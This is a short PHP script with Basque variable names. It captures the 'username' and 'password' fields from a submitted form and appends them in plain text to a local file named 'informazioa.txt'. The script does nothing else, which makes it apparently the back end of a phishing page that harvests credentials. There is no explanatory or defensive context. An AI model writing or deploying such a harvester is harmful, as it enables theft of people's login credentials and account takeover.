<?php
    $datua= "username " . $_POST['username'] . " - password " . $_POST['password'];
    File_put_contents("informazioa.txt", $datua, FILE_APPEND);
?>